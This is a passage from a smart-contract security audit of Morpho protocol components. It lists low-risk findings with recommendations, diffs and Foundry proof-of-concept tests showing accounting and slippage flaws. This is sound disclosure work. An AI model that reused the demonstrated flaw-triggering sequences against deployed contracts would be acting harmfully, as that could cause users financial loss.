        assertEq(vault.config(marketIds[0]).cap, 0);
 
       // 3. ALLOCATOR reallocate supplies from market0 to the rest
       MarketAllocation[] memory alloc = new MarketAllocation[](3);
       alloc[0].marketParams = allMarkets[0];
       alloc[0].assets = 0;
       alloc[1].marketParams = allMarkets[1];
       alloc[1].assets = 2e18; // keep it as it is
       alloc[2].marketParams = allMarkets[2];
       alloc[2].assets = type(uint256).max;
       vm.prank(ALLOCATOR);  
       vault.reallocate(alloc);

       //. 4. ALLOCATOR removes market0
       uint256[] memory indexes = new uint256[](2);
       indexes[0]  = 1;
       indexes[1]  = 2;
       vm.prank(ALLOCATOR);  
       vault.updateWithdrawQueue(indexes);
          
       // Now market0 has been removed.
       assertEq(vault.supplyQueueLength(), 3); // not deleted from supplyQueue 
       assertEq(vault.withdrawQueueLength(), 2);  
       
       console2.log("vault total assets: ", vault.totalAssets());
       console2.log("SUPPLIER total shares:", vault.balanceOf(SUPPLIER));
       console2.log("SUPPLIER total assets:", vault.convertToAssets(vault.balanceOf(SUPPLIER)));
       
        _setCap(allMarkets[0],  1e18);
        assertEq(vault.supplyQueueLength(), 4);
        assertEq(vault.withdrawQueueLength(), 3);


        console2.log("vault total assets: ", vault.totalAssets());
        console2.log("SUPPLIER total shares:", vault.balanceOf(SUPPLIER));
        console2.log("SUPPLIER total assets:", vault.convertToAssets(vault.balanceOf(SUPPLIER)));
       
        console2.log("supply queue length: ", vault.supplyQueueLength());
        console2.log("withdraw queue length: ", vault.withdrawQueueLength());
        console2.log("maxDeposit: %d", vault.maxDeposit(address(makeAddr("")))); // should be 1+2+3 - 3.3 = 2.7
        
        assertEq((vault.maxDeposit(address(makeAddr("")))), 3.7 ether); // too much
    }
}
```


**Recommendation**:
1) whenever a market is removed from withdrawQueue, it should be removed from supplyQueue as well; or 2) maxDeposit() will not double account a duplicate. 



### `ERC20WrapperBundler.erc20WrapperDepositFor` not payable

**Severity:** Low risk

**Context:** [BaseBundler.sol#L15-L15](morpho-blue-bundlers/src/BaseBundler.sol#L15-L15), [ERC20WrapperBundler.sol#L30-L30](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L30-L30)

**Description**: All bundler functions that are called through a delegatecall-style multi-call must be payable because a single function requiring `msg.value > 0` in a batch will use the same `msg.value` for all other function calls in the delegatecall-batch. If a function is not `payable` but receives `msg.value > 0` it will revert.

See this note on `BaseBundler`:
> Every bundler inheriting from this contract must have their external functions payable as they will be delegate called by the `multicall` function (which is payable, and thus might pass a non-null ETH value).

The `ERC20WrapperBundler.erc20WrapperDepositFor` cannot be used in a multicall and will lead to reverting the entire batch.

**Recommendation**: Consider adding the `payable` modifier to the function.



### `ERC20WrapperBundler.erc20WrapperWithdrawTo` not payable

**Severity:** Low risk

**Context:** [BaseBundler.sol#L15-L15](morpho-blue-bundlers/src/BaseBundler.sol#L15-L15), [ERC20WrapperBundler.sol#L47-L47](morpho-blue-bundlers/src/ERC20WrapperBundler.sol#L47-L47)

**Description**: All bundler functions that are called through a delegatecall-style multi-call must be payable because a single function requiring `msg.value > 0` in a batch will use the same `msg.value` for all other function calls in the delegatecall-batch. If a function is not `payable` but receives `msg.value > 0` it will revert.

See this note on `BaseBundler`:
> Every bundler inheriting from this contract must have their external functions payable as they will be delegate called by the `multicall` function (which is payable, and thus might pass a non-null ETH value).

The `ERC20WrapperBundler.erc20WrapperWithdrawTo` cannot be used in a multicall and will lead to reverting the entire batch.

**Recommendation**: Consider adding the `payable` modifier to the function.



### Broken slippage check in `ERC4626.erc4626Mint`

**Severity:** Low risk

**Context:** [ERC4626Bundler.sol#L36-L36](morpho-blue-bundlers/src/ERC4626Bundler.sol#L36-L36)

**Description**:  A user specifies `shares` and a `maxAssets` slippage parameter for the `erc4626Mint` function. However, the slippage parameter is not directly applied to the `shares` _parameter_, it is applied to the smaller shares value of:

```solidity
shares = Math.min(shares, IERC4626(vault).maxMint(receiver));
```

This leads to the user potentially accepting a worse share price for the mint than they specified in the function.

**Example**: A user wants to mint 1000 shares at a share price of 1.0 and specifies `shares = 1000`, `maxAssets = 1000`. Imagine `maxMint` returning only 1 share and the share price suddenly being `1000.0`. The user now pays 1000 assets for a single share and the slippage check still passes.

**Recommendation**: Revert if the `shares` are less than `maxMint`, or adjust the `maxAssets` proportional to `maxMint/initialDesiredShares` to enforce the same share price.



### Broken slippage check in `ERC4626.erc4626Withdraw`

**Severity:** Low risk

**Context:** [ERC4626Bundler.sol#L93-L93](morpho-blue-bundlers/src/ERC4626Bundler.sol#L93-L93)

**Description**:  A user specifies `assets` and a `maxShares` slippage parameter for the `erc4626Withdraw` function. However, the slippage parameter is not directly applied to the `assets` _parameter_, it is applied to the smaller assets value of:

```solidity
assets = Math.min(assets, IERC4626(vault).maxWithdraw(owner));
```

This leads to the user potentially accepting a worse share price than they specified in the function.

**Example**: A user wants to withdraw 1000 assets at a share price of 1.0 and specifies `assets = 1000`, `maxShares = 1000`. Imagine `maxWithdraw` returning only 1 asset and the share price suddenly being `0.001`. The user now burns all 1000 shares for a single asset and the slippage check still passes.

**Recommendation**: Revert if the `assets` are less than `maxWIthdraw`, or adjust the `maxShares` proportional to `maxWIthdraw/initialDesiredAssets` to enforce the same share price.



### Undesired slippage check in `erc4626Deposit`

**Severity:** Low risk

**Context:** [ERC4626Bundler.sol#L63-L64](morpho-blue-bundlers/src/ERC4626Bundler.sol#L63-L64)

**Description**:  A user specifies `assets` and a `minShares` slippage parameter for the `erc4626Deposit` function. However, the slippage parameter is not directly applied to the `assets` _parameter_, it is applied to the smaller assets value of:

```solidity
assets = Math.min(assets, IERC4626(vault).maxDeposit(receiver));
assets = Math.min(assets, ERC20(asset).balanceOf(address(this)));
```

This leads to the function potentially reverting even if the shares were minted at the price desired by the user.

**Example**: A user wants to mint 1000 shares at a share price of 1.0 and specifies `assets = 1000`, `minShares = 1000`. Imagine `maxDeposit` returning only 500 assets but the share price stays the same at `1.0`. The user now pays 500 assets for the 500 shares and the slippage check reverts even though the user might have liked to still mint at this price.

**Recommendation**: The fix depends on the desired behavior for this function. From the natspec for `minShares`:
> The minimum amount of shares to mint in exchange for `assets`.

The problem is that when the function changes `assets`, this parameter becomes undefined because we are not exchanging the initial `assets` anymore. As it is adjusting the `assets` the user might be more interested in a slippage parameter that checks the _share price_ instead of an absolute amount. This would not contradict the `minShares` definition.
Consider removing the code that changes the `assets` parameter and revert instead if the contract balance or the max deposit is less than `asset`. Alternatively, the slippage check should take into account the share price instead of the `minShares` for `assets`.



### Undesired slippage check in `erc4626Redeem`

**Severity:** Low risk

**Context:** [ERC4626Bundler.sol#L119-L119](morpho-blue-bundlers/src/ERC4626Bundler.sol#L119-L119)

**Description**:  A user specifies `shares` and a `minAssets` slippage parameter for the `erc4626Redeem` function. However, the slippage parameter is not directly applied to the `shares` _parameter_, it is applied to the smaller shares value of:

```solidity
shares = Math.min(shares, IERC4626(vault).maxRedeem(owner));
```

This leads to the function potentially reverting even if the shares were redeemed at the price desired by the user.

**Example**: A user wants to redeem 1000 shares at a share price of 1.0 and specifies `shares = 1000`, `minAssets = 1000`. Imagine `maxRedeem` returning only 500 shares but the share price stays the same at `1.0`. The user now redeems 500 shares for 500 assets and the slippage check reverts even though the user might have liked to still redeem at this price.

**Recommendation**: The fix depends on the desired behavior for this function. From the natspec for `minAssets`:
> The minimum amount of assets to withdraw in exchange for `shares`.

The problem is that when the function changes `shares`, this parameter becomes undefined because we are not exchanging the initial `shares` anymore. As it is adjusting the `shares` the user might be more interested in a slippage parameter that checks the _share price_ instead of an absolute amount. This would not contradict the `minAssets` definition.
Consider removing the code that changes the `shares` parameter and revert instead if the max redeem is less than `shares`. Alternatively, the slippage check should take into account the share price instead of the `minAssets`.



### Undesired slippage check in `stakeEth`

**Severity:** Low risk

**Context:** [StEthBundler.sol#L48-L48](morpho-blue-bundlers/src/StEthBundler.sol#L48-L48)

**Description**:  A user specifies `amount` and a `minShares` slippage parameter for the `stakeEth` function. However, the slippage parameter is not directly applied to the `amount` _parameter_, it is applied to the smaller amount value of:

```solidity
amount = Math.min(amount, address(this).balance);
```

This leads to the function potentially reverting even if the shares were minted at the price desired by the user.

**Example**: A user wants to mint 1000 shares at a share price of 1.0 and specifies `amount = 1000`, `minShares = 1000`. Imagine `address(this).balance` returning only 500 amount but the share price stays the same at `1.0`. The user now pays 500 amount for the 500 shares and the slippage check reverts even though the user might have liked to still deposit at this price.

**Recommendation**: The fix depends on the desired behavior for this function. From the natspec for `minShares`:
> The minimum amount of shares to mint in exchange for `amount`.

The problem is that when the function changes `amount`, this parameter becomes undefined because we are not exchanging the initial `amount` anymore. As it is adjusting the `amount` the user might be more interested in a slippage parameter that checks the _share price_ instead of an absolute amount. This would not contradict the `minShares` definition.
Consider removing the code that changes the `amount` parameter and revert instead if the contract balance is less than `amount`. Alternatively, the slippage check should take into account the share price instead of the `minShares`.



### CompoundV2 bundler doesn't revert on failure	_(duplicate of [Missing important check if `repay` and `redeem` functions in `CompoundV2MigrationBundler.sol` are successful])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
Compound V2 returns uint256 errorCodes instead of reverts. You can check documentation https://docs.compound.finance/v2/ctokens/#error-codes

CompoundV2MigrationBundler.sol doesn't process error codes, it assumes that Compound will revert on failure:
https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L41-L73
```solidity
    function compoundV2Repay(address cToken, uint256 amount) external payable protected {
        if (cToken == C_ETH) {
            ...

@>          ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());
        } else {
            ...

@>          ICToken(cToken).repayBorrowBehalf(initiator(), amount);
        }
    }
    
    function compoundV2Redeem(address cToken, uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(cToken).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

@>      ICToken(cToken).redeem(amount);
    }
```

However by design bundlers expect to revert on failure, like it's implemented in every other bundler. As a result, unintended consequences can appear because of that unexpected behaviour, because that functions are supposed to be used in multicall. Hence multicall batch won't revert and continue processing.

- Recommendation
Process return codes.
```diff
    function compoundV2Repay(address cToken, uint256 amount) external payable protected {
        if (cToken == C_ETH) {
            ...

-           ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());
+           uint256 result = ICEth(C_ETH).repayBorrowBehalf{value: amount}(initiator());
+           require(result == 0);
        } else {
            ...

-           ICToken(cToken).repayBorrowBehalf(initiator(), amount);
+           uint256 result = ICToken(cToken).repayBorrowBehalf(initiator(), amount);
+           require(result == 0);
        }
    }
    
    function compoundV2Redeem(address cToken, uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(cToken).balanceOf(address(this)));

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

-       ICToken(cToken).redeem(amount);
+       uint256 result = ICToken(cToken).redeem(amount);
+       require(result == 0);
    }
```



### Incorrect slippage protection in ERC4626Bundler	_(duplicate of [Broken slippage check in `ERC4626.erc4626Mint`])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
Functions `erc4626Mint()` and `erc4626Withdraw()` are wrappers of standard ERC4626 `mint()` and `withdraw()` with slippage protection.
Let's take a look on how it's implemented by example of mint. User specifies amount of `shares` to mint using `maxAssets` of asset at max. However `shares` can be truncated to `maxMint` amount, in this case user's specified `maxAssets` corresponds to previous amount, therefore it's incorrect to use it in case of truncation.

https://github.com/morpho-org/morpho-blue-bundlers/blob/3506b0e19ba78332cd85a95cf4226a79bf627d0f/src/ERC4626Bundler.sol#L28-L44
```solidity
    function erc4626Mint(address vault, uint256 shares, uint256 maxAssets, address receiver)
        external
        payable
        protected
    {
        require(receiver != address(0), ErrorsLib.ZERO_ADDRESS);
        /// Do not check `receiver != address(this)` to allow the bundler to receive the vault's shares.

@>      shares = Math.min(shares, IERC4626(vault).maxMint(receiver));

        require(shares != 0, ErrorsLib.ZERO_SHARES);

        _approveMaxTo(IERC4626(vault).asset(), vault);

        uint256 assets = IERC4626(vault).mint(shares, receiver);
        require(assets <= maxAssets, ErrorsLib.SLIPPAGE_EXCEEDED);
    }
```

For example user send `erc4626Mint()` with `shares = 100` and `maxAssets = 100`, thus specifying price = 1.
But `maxMint()` is only 50, so now slippage protection is incorrect, as it specifies asset/share price = 2.

Opposite behavior in function `erc4626Withdraw()`.

- Recommendation
In case you decrease `assets` or `shares` in `erc4626Mint()` or `erc4626Withdraw()` accordingly, decrease also `maxAssets` or `maxShares` proportionally



### Oracle's `SCALE_FACTOR` can be zero for certain base, quote, and vault token combinations

**Severity:** Low risk

**Context:** [ChainlinkOracle.sol#L106-L110](morpho-blue-oracles/src/ChainlinkOracle.sol#L106-L110)

The listed assumptions for a correctly functioning oracle are:

> The vault's sample shares quoted as assets and the base feed prices don't overflow when multiplied.
> The quote feed prices don't overflow when multiplied.

The oracle also fails if the `SCALE_FACTOR` is zero.

```solidity
SCALE_FACTOR = 10
** (
    36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals() - baseTokenDecimals
        - baseFeed1.getDecimals() - baseFeed2.getDecimals()
) / vaultConversionSample;
```

The scale factor is 0 if `baseTokenDecimals + baseFeed1.getDecimals() + baseFeed2.getDecimals() + log10(vaultConversionSample) > 36 + quoteTokenDecimals + quoteFeed1.getDecimals() + quoteFeed2.getDecimals()`. The likelihood for this to happen is medium-high:

This can easily happen if the base decimals or vault decimals are larger than the quote decimals. This can also easily happen if only a single quote feed is used but two base feeds are used for the conversion, or if one base feed and a vault sample is used. This is especially bad as the default ERC4626 OZ vault implementation can have [more than 18 decimals](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/0b1b5f89ef342b73e23e2fb6783d7a377478181f/contracts/token/ERC20/extensions/ERC4626.sol#L107). 

The impact is that the `oracle`'s `price()` will always report a price of `0`. Morpho blue or other protocols integrating this oracle to convert assets will end up with token amounts of `0`. Certain base, quote, and vault combinations cannot be supported on the oracle / on Morpho blue using this official oracle contract.


**Example**:
We want to express vETH (a vault share token earning interest on WETH underlying) amounts in GUSD.
Quote asset is 2-decimal GUSD, quote feed is 8-decimal USD/GUSD, base asset is 18-decimal WETH, base feed is 8-decimal USD/ETH, imagine the vETH vault is a 24-decimal [OZ-ERC4626 vault](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/0b1b5f89ef342b73e23e2fb6783d7a377478181f/contracts/token/ERC20/extensions/ERC4626.sol#L107) (with a decimal offset of 6, same as Morpho Blue). The result will be:

```
36 + 2 + 8 = 46
- (18 + 8 + 24 = 50)
= -4
SCALE_FACTOR = 0 by "/ vaultConversionSample" integer division
```

Note that this example doesn't even use `baseFeed2` which will make it much more likely in practice to end up with a higher total base decimals sum.

**Recommendation**: First, the constructor should always revert if the `SCALE_FACTOR` is 0. Currently, if it becomes zero through `vaultConversionSample` division, the construcot does not revert, the oracle seems correctly deployed, but the `price()` will always be zero.
Second, consider extending the oracle precision of `36` or add the `SCLAE_FACTOR` being non-zero to the list of assumptions for a correctly-working oracle.



### `wMulDown` and `wDivDown` have different rounding behavior based on sign

**Severity:** Low risk

**Context:** [MathLib.sol#L13-L19](morpho-blue-irm/src/libraries/MathLib.sol#L13-L19)

**Description**: The rounding behavior in `wMulDown` and `wDivDown` depends on the sign of `a` and `b`, it's technically a truncation, not a rounding down. The difference is that if `a` and `b` have opposite signs, the current code will round towards 0 and not towards negative infinity. Usually, "rounding down" refers to rounding towards negative infinity.

**Recommendation**: Rounding towards 0 is okay when multiplying with the symmetric `error` (range -1 to 1) variable. For the other arithmetic calculations, it's hard to say what should be considered correct, there are arguments for both rounding towards 0 and negative infinity. Consider checking these calculations again.



### Merkle root cannot be deleted in 1 call when there is not a pending root

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L81-L81](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L81-L81)

- Details
**UniversalRewardsDistributor.submitRoot()** submits a new root and ipfs hash to be accepted after the timelock passes. The function reverts if the new values are the same as the pending one's. This makes it impossible to reset both the merkle root and ipfsHash when there is not a pending root. 

When there is not a pending root, **newRoot**, newIpfs**, **pendingRoot.root** and pendindRoot.ipfsHash** will all be bytes(0), causing a revert.

In order to reset the root and hash, a dummy pending root has to be submitted first. Then the require will pass when the function is called with bytes32(0) for both the arguments.

- Recommendation
Modify the require statement

```diff
-    require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);
+    require(pendingRoot.validAt == 0 || newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING); 
```



### Wrong borrow rate (adjustments) near target utilization rate neighborhood

**Severity:** Low risk

**Context:** [AdaptiveCurveIrm.sol#L135-L137](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L135-L137)

**Description**: The borrow rate adjustment algorithm computes a linear adaptation based on the last utilization rate compared to the target utilization rate. This linear adaptation is then applied to the borrow rate, it can always only go in one direction:
- If the last utilization rate < target utilization rate, it will reduce the borrow rate (to incentive borrowers)
- If the last utilization rate > target utilization rate, it will increase the borrow rate (to disincentive borrowers)

However, the borrow interest that should be paid at each time step will slightly push the utilization rate each time. This has been noticed by the team:

```solidity
Note that the speed is assumed constant between two interactions, but in theory it increases because of interests. So the rate will be slightly underestimated.
```

However, what they didn't think of is that the current algorithm can actually reverse the borrow rate direction and lead to extremely wrong borrow values:
- The last utilization is slightly below the target utilization. The borrow rate should decrease but the utilization ratio will still increase as borrow interest is paid.
- This interest pushes the utilization above the target utilization ratio and the borrow rate adjustments should reverse, the borrow rate should now increase. This is not done in the algorithm.

This leads to drastic differences in what the actual borrow rate should be and what the current borrow rate is with the current adaptive curve algorithm. This can be seen if we compare the mentioned scenario by triggering a borrow every day over a year compared to only once after a year.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/AdaptiveCurveIrm.sol";

import "../lib/forge-std/src/Test.sol";

contract CustomTest is Test {
    using MathLib for int256;
    using MathLib for uint256;
    using UtilsLib for int256;
    using MorphoMathLib for uint128;
    using MorphoMathLib for uint256;
    using MarketParamsLib for MarketParams;

    event BorrowRateUpdate(Id indexed id, uint256 avgBorrowRate, uint256 rateAtTarget);

    int256 internal constant CURVE_STEEPNESS = 4 ether;
    int256 internal constant ADJUSTMENT_SPEED = int256(50 ether) / 365 days;
    int256 internal constant TARGET_UTILIZATION = 0.9 ether;
    int256 internal constant INITIAL_RATE_AT_TARGET = int256(0.01 ether) / 365 days;

    AdaptiveCurveIrm internal irm;
    MarketParams internal marketParams = MarketParams(address(0), address(0), address(0), address(0), 0);

    function setUp() public {
        irm =
        new AdaptiveCurveIrm(address(this), CURVE_STEEPNESS, ADJUSTMENT_SPEED, TARGET_UTILIZATION, INITIAL_RATE_AT_TARGET);
        vm.warp(90 days);
    }

    function testRateBelowTargetUtilizationNoPing() public {
        Market memory market;
        market.totalSupplyAssets = 1 ether;
        market.totalBorrowAssets = uint128(uint256(TARGET_UTILIZATION));
        assertEq(irm.borrowRate(marketParams, market), uint256(INITIAL_RATE_AT_TARGET));
        assertEq(irm.rateAtTarget(marketParams.id()), INITIAL_RATE_AT_TARGET);

        market.lastUpdate = uint128(block.timestamp);
        vm.warp(block.timestamp + 365 days);

        market.totalBorrowAssets = uint128(uint256(0.89e18));
        irm.borrowRate(marketParams, market);

        // 0.44% instead of 1%
        assertApproxEqRel(irm.borrowRate(marketParams, market) * 365 days, uint256(0.0044 ether), 0.005 ether);
    }

    function testRateBelowTargetUtilizationPingsEveryDay() public {
        Market memory market;
        market.totalSupplyAssets = 1 ether;
        market.totalBorrowAssets = uint128(uint256(TARGET_UTILIZATION));
        assertEq(irm.borrowRate(marketParams, market), uint256(INITIAL_RATE_AT_TARGET));
        assertEq(irm.rateAtTarget(marketParams.id()), INITIAL_RATE_AT_TARGET);

        for (uint256 i; i < 365 days / 1 days; ++i) {
            market.lastUpdate = uint128(block.timestamp);
            vm.warp(block.timestamp + 1 days);

            uint256 avgBorrowRate = irm.borrowRate(marketParams, market);
            uint256 interest = market.totalBorrowAssets.wMulDown(avgBorrowRate.wTaylorCompounded(1 days));
            market.totalSupplyAssets += uint128(interest);
            market.totalBorrowAssets += uint128(interest);
        }

        // 1.3% instead of 1%
        assertApproxEqRel(irm.borrowRate(marketParams, market) * 365 days, uint256(0.013 ether), 0.005 ether);
    }
}
```

When applying the rate every day starting from 0.89% utilization (target 90%), it correctly decreases the borrow rate first, but once the utilization ratio gets pushed past the target ratio, it increases again, resulting in a final borrow rate of 1.3%.
The current algorithm does never adjust its direction and ends up reducing the borrow rate to 0.44% if triggered after a year.
Note that the "So the rate will be slightly underestimated." comment is wrong for the rate reversal case, this is an underestimation by 325%.

**Recommendation**: The algorithm needs to take into account borrow rate reversals, once the initial utilization rate crosses the target utilization rate due to interest, the rate adjustments reverse. Note that this rate reversal can only happen once as the _utilization ratio_ only ever increases. You can compute the point when this happens and then split the algorithm into two separate cases.



### `WEXP_UPPER_BOUND` can be increased

**Severity:** Low risk

**Context:** [ExpLib.sol#L19-L19](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L19-L19)

**Description**: The `WEXP_UPPER_BOUND` is supposed to be the largest value such that "above this bound, `wExp` is clipped to avoid overflowing when multiplied with 1 ether". However, you can push slightly more, for example, running the uncapped `wExp` algorithm on `ExpLib.WEXP_UPPER_BOUND + 1e15` still does not overflow when multiplied by 1e18.

**Recommendation**: Consider increasing the cap to allow for more computations at the near-end of the `wExp` domain to be more accurate.



### Large numeric error at `WEXP_UPPER_VALUE`

**Severity:** Low risk

**Context:** [ExpLib.sol#L22-L22](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L22-L22)

**Description**: `wExp(WEXP_UPPER_VALUE) = 57716089161558943949701069502944508345128.422502756744429568 ether`, whereas the real value is [exp(93.859467695000404319)](https://www.wolframalpha.com/input?i=exp%2893.859467695000404319%29) = `5.78960446186578107... × 10^40`. This gives an error of 0.3%.

**Recommendation**: Consider increasing the accuracy of the algorithm at the near-end of the domain.



### `wExp` not stricly monotonic because of lack of precision

**Severity:** Low risk

**Context:** [ExpLib.sol#L25-L25](morpho-blue-irm/src/libraries/adaptive-curve/ExpLib.sol#L25-L25)

**Description**: The `exp` function is strictly monotonic, i.e., for `x1, x2` with `x2 > x1`, you'd assume `wExp(x2) > wExp(x1)`. This is not the case for `wExp`:

```solidity
  x1: -41252948771616899030
  x2: x1 + 5e17 = -40752948771616899030
  y1: 1
  y2: 1
```

It can happen that `_newRateAtTarget` returns the same rate for different `linearAdaptation`s due to lack of precision.

**Recommendation**: Consider increasing the precision of the function to work on more than 18 decimals.



### `Metamorpho` will have more than 18 decimals

**Severity:** Low risk

**Context:** [ConstantsLib.sol#L16-L16](metamorpho/src/libraries/ConstantsLib.sol#L16-L16)

**Description**: The Metamorpho vault's tokens use OZ's ERC4626 `decimalsOffset` of 6 which leads to a total `decimals()` of `_underlyingDecimals + _decimalsOffset()`. If the `underlyingDecimals` are more than 12, the vault tokens will have a total `decimals()` of more than 18. Most protocols only support tokens with up to 18 decimals which will make it impossible to integrate Metamorpho vaults.

**Recommendation**: Consider reducing the `_decimalsOffset()` to 0.



### Inaccurate assumptions for `updateWithdrawQueue`

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L342-L343](metamorpho/src/MetaMorpho.sol#L342-L343)

**Description**: The natspec for `updateWithdrawQueue` states the following:

> 1. Removing a market requires the vault to have 0 supply on it;

This is not true because of forced removals, see the `if (MORPHO.supplyShares(id, address(this)) != 0)` branch in this function that works when the supply is non-zero.

> 2. the call to `sortWithdrawQueue` can be griefed by a frontrun

The `sortWithdrawQueue` function does not exist. It might refer to `updateWithdrawQueue`.

**Recommendation**: Consider correcting the natspec.



### Reallocations can fail because of withdrawal order

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L397-L397](metamorpho/src/MetaMorpho.sol#L397-L397)

**Description**: The `reallocate(allocations)` function mixes both withdrawals and deposits from/to vaults in the `allocations` array. This array is executed sequentially. It can happen that a deposit fails in the current sequence that would not fail if a later withdrawal was performed first.

**Recommendation**: The function should not depend on the withdrawal order (or deposit order except when using the `type(uint256).max` max deposit indicator). Consider looping through the `allocations` twice, in the first iteration only execute withdrawals, and in the second iteration execute the deposits. Alternatively, allocators should always sort `allocations` such that withdrawals are executed first, this is also easy to verify in the contract.



### No idle allocations in `reallocate` & `withdraw`

**Severity:** Low risk

**Context:** [README.md#L79-L79](metamorpho/README.md#L79-L79), [MetaMorpho.sol#L445-L445](metamorpho/src/MetaMorpho.sol#L445-L445)

**Description**: The `reallocate` natspec states:

> @dev Any additional liquidity withdrawn during reallocation will be kept idle.

Furthermore, the README states:

> Upon a withdrawal, the vault will first withdraw from the idle supply and then withdraw up to the liquidity of each Morpho Blue market in the `withdrawalQueue` in the order set.

The contract does not have a direct concept of idle supply (supply sitting idly in the contract balance). 
The `reallocate` enforces that the withdrawn assets are fully deposited to other markets.
One needs to allocate everything to a market and can build an "idle market" that cannot be borrowed from this way.

```solidity
if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
```

**Recommendation**: Consider removing all references that talk about idle supply.



### `maxWithdraw` function is wrong for `feeRecipient`	_(duplicate of [`maxWithdraw` and `maxRedeem` could return wrong value if called by vaut's fee recipient])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L546-L546](metamorpho/src/MetaMorpho.sol#L546-L546)

**Description**: The `maxWithdraw(owner)` function accrues fees and then uses `balanceOf(owner)` to convert the owner's shares to assets. This does not work for the `feeRecipient` as the `feeShares` in `_maxWithdraw` are not added to their `balanceOf(feeRecipient)`. The assets to withdraw are underestimated for `feeRecipient`.

**Recommendation**: Consider adding the `feeShares` on top of the shares balance if `owner == feeRecipient`.



### `maxRedeem` function is wrong for `feeRecipient`	_(duplicate of [`maxWithdraw` and `maxRedeem` could return wrong value if called by vaut's fee recipient])_

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L552-L552](metamorpho/src/MetaMorpho.sol#L552-L552)

**Description**: The `maxRedeem(owner)` function accrues fees and then uses `balanceOf(owner)` to convert the owner's assets to shares. This does not work for the `feeRecipient` as the `feeShares` in `_maxWithdraw` are not added to `balanceOf(feeRecipient)` which is used in the returned `_assets = _convertToAssetsWithTotals(balanceOf(feeRecipient))`. The shares to redeem are underestimated for `feeRecipient`.

**Recommendation**: Consider adding the `feeShares` on top of the shares balance if `owner == feeRecipient`.



### Wrong explanation why withdrawing from Morpho cannot fail in `_simulateWithdrawMorpho`

**Severity:** Low risk

**Context:** [MetaMorpho.sol#L858-L858](metamorpho/src/MetaMorpho.sol#L858-L858)

**Description**: The `_simulateWithdrawMorpho` wants to ensure the simulation is accurate relative to `_withdrawMorpho` and gives three arguments why the "real" withdraw would not fail:

```
// 1. oracle.price() is never called (the vault doesn't borrow)
// 2. the amount is capped to the liquidity available on Morpho
// 3. virtually accruing interest didn't faila
```

The first reason is wrong. It's true that `oracle.price()` is never called but that's _not_ because the vault doesn't borrow. It's because a `withdraw` supply does not need to check for the health of the withdrawer - even when borrowing. Only a withdraw of **collateral** needs to perform this check.

**Recommendation**: Change the first argument to "1. `oracle.price()` is never called on `withdraw`"



### Constructor lacks address(0) checks for immutable state variables

**Severity:** Low risk

**Context:** [ERC20PermissionedBase.sol#L38-L38](erc20-permissioned/src/ERC20PermissionedBase.sol#L38-L38)

**Description**:

The constructor is used in contracts to initialize variables at construction level. Address(0) checks must be performed in constructor while setting state variables, especiallly if it `immutable` variable or the variable does not have setter function after its deployment. 

Similar case can be seen in `ERC20PermissionedBase.sol` constructor, where address(0) checks are missing while setting `MORPHO` and `BUNDLER` contract address and these variables are immutable.


**Recommendation**:

It is recommended to add checks for address(0) in constructor and it is best practice to validate address before deployment.

```diff

    constructor(string memory name_, string memory symbol_, IERC20 underlyingToken, address morpho, address bundler)
        ERC20Wrapper(underlyingToken)
        ERC20Permit(name_)
        ERC20(name_, symbol_)
    {
+     require(morpho != address(0), "invalid address");
+     require(bundler != address(0), "invalid address");
        MORPHO = morpho;
        BUNDLER = bundler;
    }
```



### Solmate safeTransferLib.sol functions does not check the codesize of the token address, which may lead to fund loss

**Severity:** Low risk

**Context:** [UniversalRewardsDistributor.sol#L8-L8](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L8-L8), [UniversalRewardsDistributor.sol#L133-L133](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L133-L133)

**Description**:

In `UniversalRewardsDistributor.sol` contract, `claim()` function is used to claim the rewards and it has used the `safeTransfer()` function from solmate library which doesn't check the existence of code at the token address. **This is a known issue while using solmate's libraries.**

Per the Solmate safeTransferLib.sol,

> Note that none of the functions in this library check that a token has code at all! .....

Hence using `safeTransferLib.sol` library may lead to miscalculation of funds and may lead to loss of funds , because if safetransfer() are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never been transferred.

`safeTransfer()` function under the hood uses low level call function which can be checked [here](https://github.com/transmissions11/solmate/blob/4b47a19038b798b4a33d9749d25e570443520647/src/utils/SafeTransferLib.sol#L90)

However, solidity documentation strictly warns that,

> The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed.

code existence must be checked especially for low level functions like call,staticcall and delegatecall.

Openzeppelin and Solady confirms this and comply this requirements in their library, **only solmate does not check code existence.**

**Recommendation**:

Check code existence check for reward token address. OR alternatively, it is recommended to use `openzeppelin's safeERC20` which takes care of token code existence.

For example understanding:


```diff
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
